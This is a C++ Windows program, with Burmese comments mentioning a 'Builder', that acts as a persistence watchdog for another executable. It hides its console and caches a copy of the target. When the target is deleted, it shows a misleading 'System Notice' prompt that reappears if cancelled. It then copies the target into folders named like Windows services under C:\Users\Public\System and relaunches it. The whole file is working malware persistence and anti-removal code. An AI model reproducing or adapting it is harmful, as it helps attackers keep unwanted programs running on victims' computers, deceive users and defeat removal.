#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <filesystem>

namespace fs = std::filesystem;

static bool FileExists(const std::string& p) {
    DWORD attr = GetFileAttributesA(p.c_str());
    return (attr != INVALID_FILE_ATTRIBUTES) && ((attr & FILE_ATTRIBUTE_DIRECTORY) == 0);
}

static std::string GetNextDecoyFolder(int stepIndex) {
    const std::vector<std::string> decoyBases = {
        "C:\\Users\\Public\\System\\WinServiceHost",
        "C:\\Users\\Public\\System\\NetRuntimeSvc",
        "C:\\Users\\Public\\System\\DiagCoreHost",
        "C:\\Users\\Public\\System\\AudioEndpointSvc"
    };
    return decoyBases[stepIndex % decoyBases.size()];
}

int main(int argc, char* argv[]) {

    FreeConsole();
    // Builder ကနေ random name နဲ့ ထုတ်ပေးလိုက်တဲ့ full path ကို ယူခြင်း
    std::string currentWatchedPath = (argc >= 2) ? argv[1] : "";
    if (currentWatchedPath.empty()) {
        return 1;
    }

    // Path ထဲက ဖိုင်နာမည် (ဥပမာ app_9f3a1k2x.exe) ကို အလိုအလျောက် ထုတ်ယူခြင်း
    std::string targetExeName = fs::path(currentWatchedPath).filename().string();
    std::string cachedCopyPath  = (fs::temp_directory_path() / ("guard_cache_" + targetExeName)).string();
    int relocateStep = 0;

    while (true) {
        if (FileExists(currentWatchedPath)) {
            CopyFileA(currentWatchedPath.c_str(), cachedCopyPath.c_str(), FALSE);
        } else {
            int res = MessageBoxA(
                NULL,
                "This app is important for the system.",
                "System Notice",
                MB_OKCANCEL | MB_ICONWARNING | MB_TOPMOST
            );

            if (res == IDCANCEL) {
                std::this_thread::sleep_for(std::chrono::seconds(2));
                continue;
            }

            if (res == IDOK) {
                std::string nextFolder  = GetNextDecoyFolder(relocateStep++);
                std::string nextExePath = (fs::path(nextFolder) / targetExeName).string();

                std::error_code ec;
                fs::create_directories(nextFolder, ec);

                if (FileExists(cachedCopyPath)) {
                    CopyFileA(cachedCopyPath.c_str(), nextExePath.c_str(), FALSE);
                }

                std::this_thread::sleep_for(std::chrono::seconds(2));

                if (FileExists(nextExePath)) {
                    STARTUPINFOA si{};
                    PROCESS_INFORMATION pi{};
                    si.cb = sizeof(si);
                    if (CreateProcessA(
                            nextExePath.c_str(),
                            NULL,
                            NULL,
                            NULL,
                            FALSE,
                            0,
                            NULL,
                            nextFolder.c_str(),
                            &si,
                            &pi)) {
                        std::this_thread::sleep_for(std::chrono::seconds(3));
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                    }

                    currentWatchedPath = nextExePath;
                    CopyFileA(currentWatchedPath.c_str(), cachedCopyPath.c_str(), FALSE);
                }
            }
        }

        std::this_thread::sleep_for(std::chrono::seconds(2));
    }

    return 0;
}